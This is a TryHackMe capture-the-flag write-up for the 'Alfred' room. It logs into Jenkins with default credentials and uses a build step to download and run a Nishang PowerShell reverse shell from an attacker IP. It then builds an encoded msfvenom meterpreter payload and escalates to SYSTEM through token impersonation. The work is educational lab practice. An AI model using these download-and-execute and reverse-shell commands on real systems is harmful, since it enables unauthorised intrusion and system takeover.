---
title: Alfred WriteUp
description: Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
tags:
- writeups
- tryhackme
- windows
- jenkins
- powershell
- metasploit
- nishang
---
## Enumeration

Target is a Windows machine so likely blocking ping

Initial port scan

```bash
sudo nmap -Pn 10.10.17.213
```

Results:
```bash
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

- Port 80 shows a webpage that looks like it's just for flavor.
- Port 3389 is RDP
- Port 8080 is a Jenkins server

Tryhackme flag field had mask of `*****:*****` so tried `admin:admin` which worked

## Initial Access

I cloned Nishang (https://github.com/samratashok/nishang.git) and served the `Shells` directory with

```bash
python -m http.server
```
Started a netcat listener on port `9001`

Created a Jenkins project with a build step of `Execute Windows batch command` with the command:
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.32.196:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.32.196 -Port 9001
```

Save the project and press Start Build.

This gets a reverse shell for powershell

## Switching Shells

Start `exploit/multi/handler` on port 9001

Generate shell.exe with
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 'LHOST=10.4.32.196' LPORT=8081 -f exe > shell.exe
```

Host shell.exe with `python -m http.server`

Run shell from powershell with
```powershell
(New-Object System.Net.WebClient).Downloadfile('http://10.4.32.196:8000/shell.exe', 'C:\Users\Public\Documents\shell.exe')
Start-Process C:\Users\Public\Documents\shell.exe
```

## Privilege Escalation

From the powershell session check privs with
```powershell
whoami /priv
```

In meterpreter the same can be done with
```
getprivs
```

Of interest are:

- SeDebugPrivilege
- SeImpersonatePrivilege

We load the meterpreter incognito module and list available tokens to use
```
use incognito
list_tokens -g
```

Output:
```
Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
...SNIP...

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
...SNIP...
```

We select `BUILTIN\Administrators` to impersonate
```
impersonate_token "BUILTIN\Administrators"
```

Checking user (`getuid`) reveals we are now running as `NT AUTHORITY\SYSTEM`

Since some permissions are enforced based off actual user not effective user of process, we have to migrate to a new process.

TryHackMe recommends `services.exe` so we go there.

For some reason I wasn't able to view the file from services.exe so I had to add a user, RDP in and retrieve the flag
through Explorer.
